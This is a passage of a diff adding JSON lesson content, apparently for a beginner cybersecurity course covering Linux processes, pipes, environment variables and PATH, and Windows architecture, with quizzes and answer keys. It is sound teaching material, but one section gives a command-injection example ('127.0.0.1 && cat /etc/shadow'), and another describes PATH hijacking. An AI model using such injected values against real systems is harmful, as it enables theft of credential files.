+    "id": "room-11",
+    "nextRoomId": "room-12"
+  },
+  {
+    "stage": 2,
+    "level": 2,
+    "levelTitle": "Level 2 \u2014 Linux Fundamentals",
+    "title": "Processes & System Monitoring (ps, top, kill)",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 11: Linux Permissions & Ownership",
+    "whyAreYouHere": "When a server is sluggish, cryptocurrency mining malware may be consuming 100% of CPU cycles in the background. In this room, you will learn how to monitor system performance in real time using `top`, list all system processes with `ps aux`, and terminate rogue processes using `kill`.",
+    "objectives": [
+      "List all system processes with `ps aux` and understand the columns (USER, PID, %CPU, %MEM, COMMAND)",
+      "Monitor real-time CPU, RAM, and process activity using `top` and `htop`",
+      "Understand Linux signals (SIGTERM = 15, SIGKILL = 9)",
+      "Terminate stuck or malicious processes using `kill` and `kill -9`",
+      "Manage background tasks using the ampersand (`&`), `jobs`, and `fg`"
+    ],
+    "vocabulary": [
+      {
+        "term": "ps aux",
+        "definition": "Displays a snapshot of every process running on the entire system for all users."
+      },
+      {
+        "term": "top / htop",
+        "definition": "An interactive real-time process viewer and system resource monitor."
+      },
+      {
+        "term": "kill",
+        "definition": "Sends an operating system signal to a process requesting or forcing its termination."
+      },
+      {
+        "term": "SIGTERM (15)",
+        "definition": "Graceful termination signal allowing a process to save data and close sockets before exiting."
+      },
+      {
+        "term": "SIGKILL (9)",
+        "definition": "Immediate, unconditional termination signal handled directly by the kernel. The process cannot catch or ignore it."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Inspecting All Processes: ps aux",
+        "content": "While `ps` only shows processes in your current terminal, **`ps aux`** reveals everything happening on the entire machine:\n\n\u2022 `a`: Show processes for **all users**.\n\u2022 `u`: Display in **user-oriented format** (shows username, CPU %, RAM %).\n\u2022 `x`: Include processes **without a controlling terminal** (background services, daemons).\n\nCombine with `grep` to find specific applications:\n`ps aux | grep nginx` checks if the Nginx web server is actively running."
+      },
+      {
+        "title": "2. Real-Time Monitoring: top",
+        "content": "Typing `top` opens an interactive dashboard that refreshes every 3 seconds:\n\n\u2022 **Header**: System uptime, active users, load average over 1, 5, and 15 minutes.\n\u2022 **Tasks**: Total running, sleeping, stopped, and zombie processes.\n\u2022 **CPU / Mem**: Percentage of CPU idle, user space, and kernel space; physical RAM usage.\n\u2022 **Process List**: Sorted by CPU consumption by default. If a process named `xmrig` is pegged at 99.8% CPU, you likely have a crypto-miner!\n\nPress `q` to exit `top`."
+      },
+      {
+        "title": "3. Terminating Rogue Processes with kill",
+        "content": "To stop a process, you send it a signal with its PID:\n\n\u2022 **Graceful Kill (`kill [PID]`)**: Sends `SIGTERM` (signal 15). The process closes database connections, flushes write buffers, and terminates cleanly.\n\u2022 **Force Kill (`kill -9 [PID]`)**: Sends `SIGKILL` (signal 9). The kernel immediately obliterates the process from RAM. Use this when malware or frozen processes refuse to respond to graceful termination!"
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Hunting and Killing a Rogue Process",
+        "codeOrDiagram": "cadet@endlessus:~$ ps aux | grep -i \"cryptominer\"\ncadet       4520  98.5  2.1 142084  8420 pts/1    R    10:15   5:20 /tmp/.hidden/cryptominer\n\ncadet@endlessus:~$ kill -9 4520\n[+] Process 4520 terminated successfully.",
+        "explanation": "Identified rogue PID 4520 consuming 98.5% CPU, then forcefully terminated it with `kill -9`."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `ps aux | head -n 4` to inspect the process table headers and first 3 system processes:",
+      "initialCommand": "",
+      "expectedCommand": "ps aux | head -n 4",
+      "simulatedOutput": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1 168420 12040 ?        Ss   09:00   0:01 /sbin/init\nroot         2  0.0  0.0      0     0 ?        S    09:00   0:00 [kthreadd]\nroot         3  0.0  0.0      0     0 ?        I<   09:00   0:00 [rcu_gp]\n[+] Process snapshot verified: PID 1 is /sbin/init.",
+      "explanation": "`ps aux` piped to `head -n 4` prints the column headers and first three processes."
+    },
+    "questions": [
+      {
+        "id": "q-12-1",
+        "type": "exact",
+        "question": "Which signal number represents SIGKILL, forcing immediate unconditional process termination by the kernel?",
+        "visualSlots": "_",
+        "acceptedAnswers": [
+          "9"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "The number 9.",
+        "explanation": "Signal 9 is SIGKILL."
+      },
+      {
+        "id": "q-12-2",
+        "type": "multiple-choice",
+        "question": "In the output of `ps aux`, what does the `%CPU` column indicate?",
+        "options": [
+          "The total number of CPU cores installed",
+          "The percentage of CPU time currently utilized by that specific process",
+          "The processor clock speed in Gigahertz",
+          "The temperature of the CPU"
+        ],
+        "correctIndex": 1,
+        "hint": "Percentage of processor usage.",
+        "explanation": "%CPU shows the fraction of CPU time consumed by the process."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: View process table",
+        "instruction": "Execute `ps aux | head -n 4` in the terminal.",
+        "hints": [
+          "Type: `ps aux | head -n 4`"
+        ]
+      }
+    ],
+    "securityConnection": "Malware frequently renames its process name or attempts to inject code into legitimate processes like `/usr/sbin/cron` to evade detection in `ps aux`. Blue teams use EDR (Endpoint Detection and Response) tools that track process execution trees and hash signatures rather than relying solely on process names.",
+    "id": "room-12",
+    "nextRoomId": "room-13"
+  },
+  {
+    "stage": 2,
+    "level": 2,
+    "levelTitle": "Level 2 \u2014 Linux Fundamentals",
+    "title": "Pipes, Redirection & Command Chaining (>, >>, |, &&)",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "30 min",
+    "prerequisites": "Room 12: Processes & System Monitoring",
+    "whyAreYouHere": "The core philosophy of Unix is: 'Write programs that do one thing and do it well. Write programs to work together.' Instead of building giant complex tools, Linux lets you chain simple utilities together using pipes and redirection to create powerful security automation one-liners. In this room, you will master standard input, output, redirection, and conditional operators.",
+    "objectives": [
+      "Understand the 3 Standard Streams: stdin (0), stdout (1), and stderr (2)",
+      "Redirect output to files using overwrite (`>`) and append (`>>`)",
+      "Chain utilities together using the pipe operator (`|`)",
+      "Redirect error streams using `2>/dev/null`",
+      "Execute conditional multi-command chains using `&&` (AND) and `||` (OR)"
+    ],
+    "vocabulary": [
+      {
+        "term": "Standard Output (stdout / 1)",
+        "definition": "The default stream where normal program output is printed (usually the terminal screen)."
+      },
+      {
+        "term": "Standard Error (stderr / 2)",
+        "definition": "The default stream where error messages are printed, kept separate from normal output."
+      },
+      {
+        "term": "Pipe (|)",
+        "definition": "Connects the standard output of the command on the left directly into the standard input of the command on the right."
+      },
+      {
+        "term": "Redirect Overwrite (>)",
+        "definition": "Writes output to a file, replacing and wiping any existing contents."
+      },
+      {
+        "term": "Redirect Append (>>)",
+        "definition": "Writes output to a file, appending to the bottom without erasing existing contents."
+      },
+      {
+        "term": "Conditional AND (&&)",
+        "definition": "Runs the second command ONLY if the first command succeeded (returned exit code 0)."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Standard Streams: stdin, stdout, and stderr",
+        "content": "Every command in Linux communicates through three standardized data streams:\n\n1. **Standard Input (`stdin` - File Descriptor 0)**: Input coming from keyboard or pipe.\n2. **Standard Output (`stdout` - File Descriptor 1)**: The regular results of the command.\n3. **Standard Error (`stderr` - File Descriptor 2)**: Error diagnostics and warnings.\n\nKeeping errors separate from normal output allows you to filter out errors while keeping useful results!"
+      },
+      {
+        "title": "2. File Redirection: > vs >> and /dev/null",
+        "content": "Instead of printing output to your screen, you can redirect it into a file:\n\n\u2022 **`>` (Overwrite)**: Overwrites the target file completely!\n  `echo \"10.10.10.50\" > target.txt`\n\n\u2022 **`>>` (Append)**: Appends new lines to the end of the file without deleting anything:\n  `echo \"10.10.10.51\" >> target.txt`\n\n\u2022 **Redirecting Errors (`2>/dev/null`)**: In Linux, `/dev/null` is the 'black hole'\u2014any data sent there vanishes forever. When searching as an unprivileged user, `find` prints hundreds of 'Permission denied' errors. Mute them like this:\n  `find / -name flag.txt 2>/dev/null` (redirects stream 2 stderr to `/dev/null`)."
+      },
+      {
+        "title": "3. The Pipe (|) and Command Chaining (&&, ||)",
+        "content": "\u2022 **The Pipe (`|`)**: Feeds the output of one command into the input of the next:\n  `cat /var/log/auth.log | grep \"Failed password\" | wc -l`\n  (Reads auth log, filters for failed passwords, counts the lines!).\n\n\u2022 **Logical AND (`&&`)**: Run command 2 only if command 1 succeeds:\n  `mkdir project && cd project` (only changes directory if folder creation worked).\n\n\u2022 **Logical OR (`||`)**: Run command 2 only if command 1 fails:\n  `ping -c 1 10.10.10.1 || echo \"Host is DOWN\"`."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Piping and Redirection in Action",
+        "codeOrDiagram": "cadet@endlessus:~$ echo \"Server Alpha\" > servers.txt\ncadet@endlessus:~$ echo \"Server Beta\" >> servers.txt\ncadet@endlessus:~$ cat servers.txt | grep \"Beta\"\nServer Beta",
+        "explanation": "Output redirected with `>` and `>>`, then read and filtered through a pipe."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `echo \"Audit Passed\" > status.txt && cat status.txt`:",
+      "initialCommand": "",
+      "expectedCommand": "echo \"Audit Passed\" > status.txt && cat status.txt",
+      "simulatedOutput": "Audit Passed\n[+] Chained command successful: Written to file and immediately printed.",
+      "explanation": "Chains write redirection (`>`) with print (`cat`) using conditional AND (`&&`)."
+    },
+    "questions": [
+      {
+        "id": "q-13-1",
+        "type": "exact",
+        "question": "Which redirection operator appends output to the end of an existing file without wiping its contents?",
+        "visualSlots": "_ _",
+        "acceptedAnswers": [
+          ">>"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Double greater-than symbol.",
+        "explanation": "The '>>' operator appends standard output to a file."
+      },
+      {
+        "id": "q-13-2",
+        "type": "multiple-choice",
+        "question": "What special device file is known as the Linux 'black hole', used to discard unwanted error messages (e.g. `2>/dev/null`)?",
+        "options": [
+          "/dev/zero",
+          "/dev/null",
+          "/dev/random",
+          "/dev/trash"
+        ],
+        "correctIndex": 1,
+        "hint": "Null device.",
+        "explanation": "`/dev/null` discards all data written to it."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Test command chaining",
+        "instruction": "Execute `echo \"Audit Passed\" > status.txt && cat status.txt`.",
+        "hints": [
+          "Type: `echo \"Audit Passed\" > status.txt && cat status.txt`"
+        ]
+      }
+    ],
+    "securityConnection": "In Command Injection vulnerabilities, attackers exploit command separators (`;`, `|`, `&&`, `||`) injected into web form inputs to execute arbitrary operating system commands (e.g. `127.0.0.1 && cat /etc/shadow`).",
+    "id": "room-13",
+    "nextRoomId": "room-14"
+  },
+  {
+    "stage": 2,
+    "level": 2,
+    "levelTitle": "Level 2 \u2014 Linux Fundamentals",
+    "title": "Environment Variables & Basic Bash Scripting",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "30 min",
+    "prerequisites": "Room 13: Pipes, Redirection & Command Chaining",
+    "whyAreYouHere": "Environment variables configure the behavior of programs and shells, storing information like your current username, home directory, and the search path for executable binaries. In this room, you will learn how environment variables work, how to write your first automated Bash script, and why the `$PATH` variable is a frequent target for privilege escalation.",
+    "objectives": [
+      "Understand what environment variables are and how to view them using `env` and `echo`",
+      "Inspect key variables: `$USER`, `$HOME`, `$SHELL`, and `$PATH`",
+      "Set temporary and permanent environment variables using `export`",
+      "Write and execute a basic Bash shell script with a shebang (`#!/bin/bash`)",
+      "Understand PATH hijacking and how attackers exploit insecure PATH settings"
+    ],
+    "vocabulary": [
+      {
+        "term": "Environment Variable",
+        "definition": "A dynamic named value that affects the way running processes behave on a computer."
+      },
+      {
+        "term": "PATH",
+        "definition": "An environment variable containing a colon-separated list of directories the shell searches when you type a command without its full path."
+      },
+      {
+        "term": "export",
+        "definition": "Exports a shell variable so child processes inherit it in their environment."
+      },
+      {
+        "term": "Shebang (#!/bin/bash)",
+        "definition": "The very first line in a script, telling the kernel which interpreter to use to execute the file."
+      },
+      {
+        "term": "Bash Script",
+        "definition": "A plain text file containing a series of shell commands executed sequentially."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. What Are Environment Variables?",
+        "content": "Environment variables are system-wide key-value pairs stored in memory:\n\n\u2022 `echo $USER` -> Prints current user (`cadet`).\n\u2022 `echo $HOME` -> Prints home directory (`/home/cadet`).\n\u2022 `echo $PWD` -> Prints current working directory.\n\nTo create your own variable in a session:\n`TARGET=\"10.10.10.15\"`\n`echo $TARGET`\n\nIf you want child processes (like Python scripts or subshells) to access it, use **`export`**:\n`export TARGET=\"10.10.10.15\"`"
+      },
+      {
+        "title": "2. The Critical Role of $PATH",
+        "content": "When you type `ls`, how does Linux know where the `ls` program is stored?\n\nIt searches every directory listed in the **`$PATH`** variable from left to right!\n\n`cadet@endlessus:~$ echo $PATH`\n`/usr/local/bin:/usr/bin:/bin:/usr/games`\n\n1. It looks for `/usr/local/bin/ls` (not found).\n2. It looks for `/usr/bin/ls` (FOUND! Runs it).\n\n**Security Alert**: If an administrator puts `.` (the current directory) at the front of `$PATH`, an attacker can place a malicious script named `ls` in a folder. When the admin types `ls`, the attacker's script runs instead!"
+      },
+      {
+        "title": "3. Writing Your First Bash Script",
+        "content": "A Bash script allows you to automate a series of commands:\n\n```bash\n#!/bin/bash\n# recon.sh - Simple reconnaissance script\nTARGET=\"10.10.10.15\"\necho \"[*] Starting scan on $TARGET...\"\nping -c 1 $TARGET\necho \"[+] Scan completed!\"\n```\n\nTo make it executable:\n`chmod +x recon.sh`\n`./recon.sh`"
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Inspecting $PATH and User Variables",
+        "codeOrDiagram": "cadet@endlessus:~$ echo $USER\ncadet\n\ncadet@endlessus:~$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+        "explanation": "`echo $VARIABLE` prints the value of any loaded environment variable."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `echo $PATH` in the terminal to inspect your executable lookup search path:",
+      "initialCommand": "",
+      "expectedCommand": "echo $PATH",
+      "simulatedOutput": "/usr/local/bin:/usr/bin:/bin\n[+] Path inspected: Executables in these directories run globally without typing full paths.",
+      "explanation": "`$PATH` contains the colon-delimited list of directories searched for executable binaries."
+    },
+    "questions": [
+      {
+        "id": "q-14-1",
+        "type": "exact",
+        "question": "Which environment variable stores the colon-separated list of directories searched by the shell when executing command names?",
+        "visualSlots": "_ _ _ _",
+        "acceptedAnswers": [
+          "PATH",
+          "$PATH"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Four letters: P-A-T-H.",
+        "explanation": "$PATH holds the binary search directories."
+      },
+      {
+        "id": "q-14-2",
+        "type": "multiple-choice",
+        "question": "What is the two-character sequence '#!' at the beginning of a script called that specifies the interpreter to use?",
+        "options": [
+          "Comment tag",
+          "Shebang (or hashbang)",
+          "Magic header",
+          "Variable prefix"
+        ],
+        "correctIndex": 1,
+        "hint": "Hash (#) + Bang (!).",
+        "explanation": "#! is the shebang line indicating the script interpreter (e.g. #!/bin/bash)."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Inspect $PATH variable",
+        "instruction": "Print the current `$PATH` variable using `echo $PATH`.",
+        "hints": [
+          "Type: `echo $PATH`"
+        ]
+      }
+    ],
+    "securityConnection": "In Linux Privilege Escalation, 'PATH Hijacking' is a common attack. If a privileged root script calls a command like `curl` without using an absolute path (`/usr/bin/curl`), an attacker who can modify `$PATH` can trick root into executing a malicious `curl` binary placed in a user-writable folder!",
+    "id": "room-14",
+    "nextRoomId": "room-15"
+  },
+  {
+    "stage": 3,
+    "level": 3,
+    "levelTitle": "Level 3 \u2014 Windows Fundamentals",
+    "title": "Windows Architecture & The NTFS Filesystem",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "25 min",
+    "prerequisites": "Level 2: Linux Fundamentals",
+    "whyAreYouHere": "While web servers and security tools often run on Linux, over 80% of enterprise corporate workstations and Active Directory networks run on Microsoft Windows. Penetration testers and incident responders must understand Windows internal architecture, drive volumes, system directories, and the Windows Registry.",
+    "objectives": [
+      "Understand Windows architecture: User Mode vs Kernel Mode (ntoskrnl.exe)",
+      "Learn the NTFS filesystem features: Access Control Lists (ACLs) and Alternate Data Streams (ADS)",
+      "Explore essential Windows directories: `C:\\Windows`, `System32`, `Program Files`, and `AppData`",
+      "Understand the Windows Registry: Hives (HKLM, HKCU, HKCR), keys, and values",
+      "Navigate Windows filesystem basics from the command line"
+    ],
+    "vocabulary": [
+      {
+        "term": "NTFS (New Technology File System)",
+        "definition": "The proprietary journaling filesystem used by modern Windows operating systems, supporting fine-grained permissions, encryption, and Alternate Data Streams."
+      },
+      {
+        "term": "Alternate Data Streams (ADS)",
+        "definition": "An NTFS feature allowing files to contain multiple streams of data under a single filename (often abused by malware to hide payloads)."
+      },
+      {
+        "term": "Windows Registry",
+        "definition": "A central hierarchical database that stores low-level settings for the operating system, hardware devices, and installed applications."
+      },
+      {
+        "term": "System32",
+        "definition": "The critical core Windows directory (`C:\\Windows\\System32`) containing core DLLs, executables, and system drivers."
+      },
+      {
+        "term": "HKLM (HKEY_LOCAL_MACHINE)",
+        "definition": "The Registry hive containing hardware and system-wide software configuration settings affecting all users on the machine."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 180\" width=\"100%\" height=\"180\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <rect x=\"30\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"70\" fill=\"#38bdf8\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">CPU</text>\n  <text x=\"100\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Arithmetic &amp; Logic</text>\n  <text x=\"100\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Executes instructions</text>\n\n  <path d=\"M 170 90 L 230 90\" stroke=\"#38bdf8\" stroke-width=\"3\" stroke-dasharray=\"4\"/>\n  <text x=\"200\" y=\"80\" fill=\"#38bdf8\" font-size=\"10\" text-anchor=\"middle\">BUS</text>\n\n  <rect x=\"230\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"300\" y=\"70\" fill=\"#10b981\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">RAM</text>\n  <text x=\"300\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Volatile Memory</text>\n  <text x=\"300\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Fast working set</text>\n\n  <path d=\"M 370 90 L 430 90\" stroke=\"#10b981\" stroke-width=\"3\" stroke-dasharray=\"4\"/>\n  <text x=\"400\" y=\"80\" fill=\"#10b981\" font-size=\"10\" text-anchor=\"middle\">NVMe</text>\n\n  <rect x=\"430\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"500\" y=\"70\" fill=\"#f59e0b\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">SSD / Storage</text>\n  <text x=\"500\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Non-Volatile</text>\n  <text x=\"500\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Permanent files</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Windows Architecture: User Mode vs Kernel Mode",
+        "content": "Windows separates software into two execution rings:\n\n\u2022 **User Mode**: Applications, Explorer shell, and background services run here. If a user application crashes, it cannot take down the operating system.\n\u2022 **Kernel Mode (`ntoskrnl.exe`)**: The core OS kernel, Hardware Abstraction Layer (HAL), and kernel device drivers (`.sys` files) run here. Flaws here trigger the infamous Blue Screen of Death (BSOD).\n\nWindows subsystems (like Win32, POSIX, and WSL) translate application API calls into kernel system calls."
+      },
+      {
+        "title": "2. Essential System Directories",
+        "content": "\u2022 `C:\\Windows\\System32`: The heart of Windows. Contains vital binaries (`cmd.exe`, `powershell.exe`, `svchost.exe`, `net.exe`) and core Dynamic Link Libraries (DLLs).\n\u2022 `C:\\Program Files` & `C:\\Program Files (x86)`: Default installation directories for 64-bit and 32-bit third-party applications.\n\u2022 `C:\\Users\\[Username]\\AppData`: Hidden directory where applications store user-specific configuration, browser history, cache, and session tokens. Malware frequently installs itself here because writing to AppData does not require Administrator privileges!"
+      },
+      {
+        "title": "3. The Windows Registry",
+        "content": "In Linux, configuration settings are stored in plain text files in `/etc`. In Windows, almost all system settings are stored in a centralized binary database called the **Windows Registry**.\n\nThe Registry is organized into 5 primary **Hives**:\n\n1. **HKLM (HKEY_LOCAL_MACHINE)**: Settings for the entire computer (boot settings, installed software, security policies).\n2. **HKCU (HKEY_CURRENT_USER)**: Settings specific to the currently logged-in user (desktop background, personal app preferences).\n3. **HKCR (HKEY_CLASSES_ROOT)**: File association mappings (which program opens `.pdf` or `.docx`).\n4. **HKU (HKEY_USERS)**: Profiles of all user accounts on the machine.\n5. **HKCC (HKEY_CURRENT_CONFIG)**: Hardware profile data gathered at system boot."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Querying the Registry via Command Line",
+        "codeOrDiagram": "C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\n    ProductName    REG_SZ    Windows 11 Pro",
+        "explanation": "The `reg query` command extracts configuration values directly from the Windows Registry without opening the graphical `regedit.exe` tool."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `echo %SYSTEMROOT%` to simulate querying the Windows system root environment variable:",
+      "initialCommand": "",
+      "expectedCommand": "echo %SYSTEMROOT%",
+      "simulatedOutput": "C:\\Windows\n[+] Variable resolved: The Windows system root directory is C:\\Windows.",
+      "explanation": "In Windows CMD, environment variables are enclosed in percent signs (e.g., `%SYSTEMROOT%`)."
+    },
+    "questions": [
+      {
+        "id": "q-15-1",
+        "type": "exact",
+        "question": "What is the standard filesystem used by modern Windows operating systems that supports Access Control Lists and Alternate Data Streams?",
+        "visualSlots": "_ _ _ _",
+        "acceptedAnswers": [
+          "NTFS"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "New Technology File System abbreviation.",
+        "explanation": "NTFS stands for New Technology File System."
+      },
+      {
+        "id": "q-15-2",
+        "type": "multiple-choice",
